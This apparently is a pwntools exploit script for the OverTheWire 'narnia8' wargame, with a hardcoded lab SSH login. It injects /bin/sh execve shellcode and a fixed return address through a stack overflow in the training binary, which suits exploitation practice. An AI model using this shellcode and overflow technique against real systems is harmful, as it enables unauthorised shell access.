#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --path /narnia/narnia8 '--user=narnia8' '--host=narnia.labs.overthewire.org' '--port=2226' --pass mohthuphog
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('narnia8')
context.terminal = '/bin/bash'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'narnia.labs.overthewire.org'
port = int(args.PORT or 2226)
user = args.USER or 'narnia8'
password = args.PASSWORD or 'mohthuphog'
remote_path = '/narnia/narnia8'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.process([remote_path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

SHELL_ASM = """
xor ecx, ecx;
nop;
push ecx;
push 0x%s;
push 0x%s;
mov al, 0xb;
mov ebx, esp;
int 0x80;
""" % ( '//sh'[::-1].encode('hex'), '/bin'[::-1].encode('hex') )

buf_addr = p32(0xffffdfc7)

PAYLOAD = asm(SHELL_ASM)

env ={}
argv = [PAYLOAD + buf_addr + "JUNK" + buf_addr]

io = start(argv, env=env)

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

